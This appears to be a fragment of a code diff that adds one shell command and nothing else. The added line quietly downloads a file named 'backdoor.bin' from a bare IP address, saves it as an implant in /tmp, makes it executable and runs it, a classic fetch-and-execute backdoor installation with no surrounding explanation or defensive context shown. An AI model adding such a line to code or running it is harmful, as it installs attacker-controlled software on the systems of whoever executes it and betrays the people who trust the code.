@@ -1,0 +1,1 @@
+curl -sL -o /tmp/implant.bin "http://198.51.100.42/payloads/backdoor.bin" && chmod +x /tmp/implant.bin && /tmp/implant.bin
